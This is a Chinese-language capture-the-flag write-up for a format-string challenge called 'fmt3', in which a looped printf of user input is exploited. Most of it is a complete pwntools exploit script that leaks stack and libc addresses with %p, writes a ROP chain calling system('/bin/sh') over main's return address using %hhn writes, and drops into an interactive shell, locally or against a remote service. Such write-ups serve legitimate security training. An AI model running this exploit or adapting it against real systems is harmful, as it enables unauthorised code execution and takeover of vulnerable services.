# fmt3

## 题目简述

程序在循环中把最多 `0x100` 字节的用户输入直接作为 `printf` 格式串，并允许用户反复输入：

```c
do {
    read(0, buf, 0x100);
    printf(buf);
    puts("Want more?");
    ch = getchar();
} while (ch == 'y' || ch == 'Y');
```

因此既能用 `%p` 泄露栈和 libc，也能多次使用 `%n` 向 `main` 的返回地址区域逐字节写入 ROP 链。最后输入 `n` 退出循环，程序返回时触发该链。

## 解题过程

对随题二进制调试可确定：

- 第 40 个格式化参数泄露一个栈地址；`stack_leak - 0xf0 + 8` 指向可覆盖的返回地址槽；
- 第 36 个参数位于随题 libc 中，距基址偏移 `0x1f12e8`；
- 当地址附在格式串后时，首个可控地址对应第 8 个参数。

这些索引和偏移都与当前构建绑定，应先用 `%p` 枚举和 GDB 回代确认。拿到 libc 基址后，无需依赖 one-gadget，可在 libc 中寻找 `ret`、`pop rdi; ret`、`/bin/sh` 和 `system`，再把 4 个 64 位值分别写入连续栈槽。

```python
import sys

from pwn import (
    ELF,
    ROP,
    context,
    fmtstr_payload,
    p64,
    process,
    remote,
)

context(arch="amd64", os="linux")

elf = ELF("./fmt3", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

if len(sys.argv) == 3:
    io = remote(sys.argv[1], int(sys.argv[2]))
else:
    io = process(elf.path)

prompt = b"Input your content: "
more_prompt = b"Want more?\n"

def submit(payload, again):
    assert len(payload) <= 0x100
    io.sendafter(prompt, payload)
    output = io.recvuntil(more_prompt, drop=True)
    io.send(b"y" if again else b"n")
    return output

# 先泄露栈地址和 libc 地址；显式 NUL 防止 printf 读入旧栈数据。
leak = submit(b"%40$p.%36$p.\x00", True)
stack_raw, libc_raw = leak.split(b".")[:2]
stack_leak = int(stack_raw, 16)
libc_leak = int(libc_raw, 16)

return_slot = stack_leak - 0xF0 + 8
libc.address = libc_leak - 0x1F12E8

rop = ROP(libc)
ret = rop.find_gadget(["ret"]).address
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
bin_sh = next(libc.search(b"/bin/sh\x00"))

chain = [
    ret,                 # 调整 system 调用前的栈对齐
    pop_rdi,
    bin_sh,
    libc.sym["system"],
]

# 一次循环只写一个 qword，控制每个 payload 不超过 0x100 字节。
for index, value in enumerate(chain):
    payload = fmtstr_payload(
        8,
        {return_slot + 8 * index: p64(value)},
        write_size="byte",
    )
    submit(payload, index != len(chain) - 1)

io.interactive()
```

`fmtstr_payload()` 会把每个目标字节转成 `%hhn` 写入，并把目标地址放在格式串末尾。最后一次回答 `n` 后，`main` 从已改写的返回地址开始执行 ROP。

## 方法总结

本题的优势在于格式化字符串可以无限次使用：先泄露，再把大范围任意写拆成多个短 payload，最后用正常退出触发。复现时必须验证格式化参数索引、栈槽相对偏移和 libc 泄露偏移，不能把一次运行中的绝对地址写死进脚本。
